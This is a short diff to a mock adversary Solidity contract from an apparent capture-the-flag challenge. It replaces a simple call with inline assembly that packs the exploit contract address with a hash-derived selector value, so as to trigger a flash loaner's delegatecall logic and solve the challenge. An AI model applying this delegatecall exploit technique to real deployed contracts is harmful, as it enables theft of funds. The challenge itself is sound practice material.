@@ -43,7 +43,14 @@ contract MockAdversaryBorrower is IFlashLoanReceiver {
         }
 
         // Call the flash loaner contract's delegatecall logic with our exploit contract.
-        (success,) = address(flashLoaner).call(abi.encodePacked(bytes4(uint32(1)), _exploit));
+        bytes32 param;
+        assembly {
+            // Store this contract's address in memory @ 0x00
+            mstore(0x00, address())
+            // Assign our param's value
+            param := or(shl(0x60, _exploit), and(keccak256(0x00, 0x20), 0xFFFFFFFF))
+        }
+        (success,) = address(flashLoaner).call(abi.encodePacked(bytes4(uint32(1)), param));
         assert(success);
 
         // Submit our tokens back to the flash loaner to solve the challenge.
